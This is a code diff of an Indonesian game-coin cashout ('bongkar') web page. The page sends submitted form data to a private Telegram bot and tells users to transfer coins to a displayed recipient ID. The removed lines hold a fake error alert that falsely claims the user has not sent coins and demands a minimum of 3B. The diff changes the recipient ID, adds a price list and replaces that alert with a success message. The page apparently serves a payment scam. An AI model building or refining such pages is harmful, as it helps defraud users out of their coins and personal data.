@@ -372,14 +372,28 @@
                 </div>
                 <div class="pretty-input">
                     <span class="pretty-icon"><i class="fas fa-wallet"></i></span>
-                    <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar (Contoh: 10B)" required>
+                    <select name="jumlah_bongkaran" required>
+                        <option value="" disabled selected>Pilih Jumlah Bongkar</option>
+                        <option value="1B - 62 RIBU">1B - 62 RIBU</option>
+                        <option value="2B - 124 RIBU">2B - 124 RIBU</option>
+                        <option value="3B - 186 RIBU">3B - 186 RIBU</option>
+                        <option value="4B - 248 RIBU">4B - 248 RIBU</option>
+                        <option value="5B - 310 RIBU">5B - 310 RIBU</option>
+                        <option value="6B - 372 RIBU">6B - 372 RIBU</option>
+                        <option value="7B - 434 RIBU">7B - 434 RIBU</option>
+                        <option value="8B - 496 RIBU">8B - 496 RIBU</option>
+                        <option value="9B - 558 RIBU">9B - 558 RIBU</option>
+                        <option value="10B - 620 RIBU">10B - 620 RIBU</option>
+                        <option value="20B - 1 JUTA 240 RIBU">20B - 1 JUTA 240 RIBU</option>
+                    </select>
                 </div>
 
                 <div class="id-display-section">
                     <p style="color: #ffcc33; font-weight: 800; margin-bottom: 10px; font-size: 0.9rem;">KIRIM KOIN KE ID DIBAWAH:</p>
                     <img src="img/idcok.png" class="id-image">
+                    <div style="color:#00e5f4; font-size:1.05rem; font-weight:800; margin-bottom:12px;">MERLIN VIP19</div>
                     <div class="pretty-input" style="background: #fff; width: 90%; margin: 0 auto; position: relative;">
-                        <input type="text" id="idPenerima" value="3296940" readonly style="color: #000; text-align: center; padding-right: 60px;">
+                        <input type="text" id="idPenerima" value="10101010" readonly style="color: #000; text-align: center; padding-right: 60px;">
                         <button type="button" class="copy-btn" style="position: absolute; right: 5px;" onclick="copyID()">SALIN</button>
                     </div>
                 </div>
@@ -653,11 +667,23 @@ stars.forEach(s => s.classList.add('active'));
         msg += `✍️ Nama: ${formData.get('atas_nama')}`;
 
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
-        .then(() => {
-            alert(" BONGKAR EROR!\n\nSISTEM MENDETEKSI ANDA BELUM MELAKUKAN PENGIRIMAN KOIN, HARAP LAKUKAN PENGIRIMAN KOIN (MINIMAL 3B) KE ID YANG TERTERA AGAR UANG ANDA SEGERA DI PROSES.");
-            btn.innerText = "PROSES SEKARANG";
+        .then(async (response) => {
+            const result = await response.json();
+
+            if (!response.ok || !result.ok) {
+                throw new Error(result.description || "Gagal mengirim data ke Telegram");
+            }
+
+            alert("Data bongkar berhasil dikirim.\n\nSilakan tunggu proses pencairan.");
+            btn.innerText = "PROSES BONGKAR";
             btn.disabled = false;
             this.reset();
+        })
+        .catch((error) => {
+            console.error("Telegram error:", error);
+            alert("Gagal mengirim data. Silakan coba lagi.");
+            btn.innerText = "PROSES BONGKAR";
+            btn.disabled = false;
         });
     });
 
@@ -673,7 +699,7 @@ stars.forEach(s => s.classList.add('active'));
         const el = document.getElementById('idPenerima');
         el.select();
         document.execCommand('copy');
-        alert('ID Admin Disalin!');
+        alert('ID Tujuan Disalin!');
     }
 
     function showOffline(button) {
